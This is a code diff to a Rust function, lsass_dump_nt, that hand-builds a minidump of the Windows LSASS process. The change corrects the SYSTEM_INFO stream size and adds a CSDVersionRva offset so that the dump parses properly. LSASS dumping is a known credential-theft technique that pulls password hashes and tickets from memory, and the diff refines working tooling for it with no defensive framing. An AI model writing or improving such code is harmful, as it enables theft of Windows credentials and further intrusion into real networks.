@@ -591,12 +591,12 @@ unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
 
     // Build MDMP
     const MOD_ENT_SZ: usize = 108;
-    const SYS_INFO_SZ: usize = 56;
+    const SYS_INFO_SZ: usize = 62; // 56 struct + 6 bytes empty MINIDUMP_STRING for CSDVersionRva
     const NUM_STREAMS: u32   = 3;
 
     let dir_off      = 32usize;
     let sys_info_off = dir_off + 3 * 12;           // 68
-    let mod_list_off = sys_info_off + SYS_INFO_SZ; // 124
+    let mod_list_off = sys_info_off + SYS_INFO_SZ; // 130
     let mod_entries_end = mod_list_off + 4 + mods.len() * MOD_ENT_SZ;
 
     // compute name blob offsets
@@ -648,6 +648,9 @@ unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
     pu32!(s+8,  10u32);   // MajorVersion
     pu32!(s+16, 19041u32); // BuildNumber
     pu32!(s+20, 2u32);     // PlatformId
+    // CSDVersionRva → 6-byte empty MINIDUMP_STRING after the 56-byte struct
+    // (Length=0, null wchar — already zero from vec![0u8])
+    pu32!(s+24, (sys_info_off + 56) as u32);
 
     // ModuleList
     pu32!(mod_list_off, mods.len() as u32);
